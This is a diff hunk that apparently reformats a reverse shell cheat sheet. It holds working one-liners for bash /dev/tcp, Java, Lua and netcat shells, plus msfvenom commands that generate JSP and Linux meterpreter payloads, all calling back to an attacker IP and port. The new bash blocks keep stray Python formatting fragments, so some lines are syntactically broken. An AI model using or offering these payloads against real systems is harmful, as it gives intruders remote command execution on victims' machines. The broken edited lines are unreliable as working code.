@@ -25,10 +25,22 @@ bash -i >& /dev/tcp/%s/%d 0>&1' % (ipaddr, port),
 exec 5<> /dev/tcp/%s/%d; cat <&5 | while read line; do $line 2>&5>&5; done' % (ipaddr, port),
 ```
 
-'java':'r = Runtime.getRuntime();p = r.exec(["/bin/sh","-c","exec 5<>/dev/tcp/%s/%d;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);p.waitFor();' % (ipaddr, port),
-        'jsp':'msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%d -f raw > revshell.jsp' % (ipaddr, port),
-        'lin-bin':'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%d -f elf > revshell' % (ipaddr, port),
-        'lua':'lua5.1 -e \'local host,port = \"%s\",%d local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host,port); while true do local cmd,status,partial = tcp:receive() local f = io.popen(cmd,'r') local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()\'' % (ipaddr, port),
+```bash
+# Java
+r = Runtime.getRuntime();p = r.exec(["/bin/sh","-c","exec 5<>/dev/tcp/%s/%d;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);p.waitFor();' % (ipaddr, port),
+```
+
+```bash
+# JSP
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%d -f raw > revshell.jsp' % (ipaddr, port),
+```
+
+```bash
+# Linux
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%d -f elf > revshell' % (ipaddr, port),
+```
+
+'lua':'lua5.1 -e \'local host,port = \"%s\",%d local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host,port); while true do local cmd,status,partial = tcp:receive() local f = io.popen(cmd,'r') local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()\'' % (ipaddr, port),
         'nc':'nc -e /bin/sh %s %d' % (ipaddr, port),
         'nc-c':'nc -c /bin/sh %s %d' % (ipaddr, port),
         'nc-mkfifo':'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f' % (ipaddr, port),
